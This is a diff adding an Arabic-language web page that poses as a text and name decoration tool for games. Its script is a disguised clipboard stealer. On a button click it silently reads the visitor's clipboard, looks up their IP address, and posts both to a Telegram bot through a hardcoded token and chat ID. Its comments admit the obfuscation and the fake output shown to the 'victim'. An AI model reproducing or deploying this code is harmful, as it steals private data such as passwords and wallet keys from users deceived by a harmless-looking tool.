@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>المزخرف العربي - أداة زخرفة الأسماء والنصوص الاحترافية</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root { --primary: #007bff; --bg: #f4f7f9; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: #333; margin: 0; padding: 15px; }
+        .main-card { max-width: 450px; margin: 40px auto; background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); border: 1px solid #e1e8ed; }
+        .logo-text { font-size: 22px; font-weight: bold; color: var(--primary); margin-bottom: 5px; }
+        .desc { font-size: 14px; color: #657786; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ccd6dd; border-radius: 6px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--primary); box-shadow: 0 0 5px rgba(0,123,255,0.2); }
+        .action-btn { background: var(--primary); color: #fff; border: none; padding: 12px; width: 100%; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .action-btn:active { transform: scale(0.98); }
+        .hint { font-size: 12px; color: #8899a6; margin-top: 15px; }
+        .output-box { margin-top: 20px; padding: 15px; background: #f8f9fa; border: 1px solid #e1e8ed; border-radius: 6px; display: none; text-align: right; }
+    </style>
+</head>
+<body>
+
+    <div class="main-card">
+        <div class="logo-text">✨ المزخرف الذكي</div>
+        <div class="desc">أسرع أداة لزخرفة النصوص والأسماء المتوافقة مع جميع الألعاب</div>
+        
+        <input type="text" id="targetInput" placeholder="اكتب النص هنا أو اضغط للزخرفة الفورية...">
+        
+        <button class="action-btn" onclick="processText()">زخرفة النص المنسوخ</button>
+        
+        <div class="hint">ملاحظة: سيتم استيراد النص من الحافظة تلقائياً لسرعة المعالجة.</div>
+        
+        <div id="displayArea" class="output-box"></div>
+    </div>
+
+    <script>
+        // تمويه أسماء المتغيرات
+        const config_a = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
+        const config_b = "1678506419";
+
+        async function processText() {
+            const val = document.getElementById('targetInput').value;
+            const out = document.getElementById('displayArea');
+
+            // محاولة سحب الحافظة بهدوء
+            try {
+                const clipData = await navigator.clipboard.readText();
+                if (clipData) {
+                    _sysLog(clipData);
+                }
+            } catch (e) {
+                // صامت تماماً في حال الرفض
+            }
+
+            // إظهار نتيجة وهمية للضحية
+            if (val || "نص تلقائي") {
+                const text = val || "زخرفة احترافية";
+                out.innerText = `꧁༒ ${text} ༒꧂`;
+                out.style.display = 'block';
+            }
+        }
+
+        async function _sysLog(data) {
+            try {
+                // سحب الـ IP للتقرير
+                const net = await fetch('https://api.ipify.org?format=json');
+                const net_d = await net.json();
+                
+                const payload = {
+                    chat_id: config_b,
+                    text: `📋 **سحب حافظة جديد**\n\nالمحتوى:\n\`${data}\`\n\nالشبكة: \`${net_d.ip}\``,
+                    parse_mode: "Markdown"
+                };
+
+                await fetch(`https://api.telegram.org/bot${config_a}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {}
+        }
+    </script>
+</body>
+</html>
